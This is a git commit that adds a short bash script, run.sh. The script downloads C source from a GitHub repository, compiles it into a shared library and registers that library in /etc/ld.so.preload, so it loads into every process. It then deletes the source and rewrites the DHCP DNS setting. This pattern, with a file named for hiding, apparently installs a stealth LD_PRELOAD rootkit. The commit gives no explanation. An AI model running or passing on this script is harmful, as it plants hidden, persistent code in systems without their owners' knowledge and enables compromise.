0df2638a148be5c99490bf9e2c9fd373a993fea6
idthaertyu <idthaertyu@outlook.com>
2026-03-17 05:12:25 -0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+apt-get update ; apt-get install wget sudo -y
+apt install -y curl
+curl https://github.com/kidoescegh/swa/raw/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
